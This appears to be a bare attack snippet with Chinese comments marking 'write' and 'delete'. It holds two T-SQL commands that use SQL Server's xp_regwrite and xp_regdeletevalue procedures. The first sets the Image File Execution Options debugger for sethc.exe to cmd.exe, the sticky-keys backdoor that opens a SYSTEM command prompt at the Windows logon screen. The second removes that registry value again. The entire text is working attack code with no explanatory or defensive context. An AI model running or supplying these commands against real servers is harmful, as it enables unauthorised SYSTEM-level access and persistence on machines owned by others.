-- 写入
EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger', @type='REG_SZ', @value='C:\WINDOWS\system32\cmd.exe'
 
-- 删除
EXEC master..xp_regdeletevalue @rootkey='HKEY_LOCAL_MACHINE', 
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger'
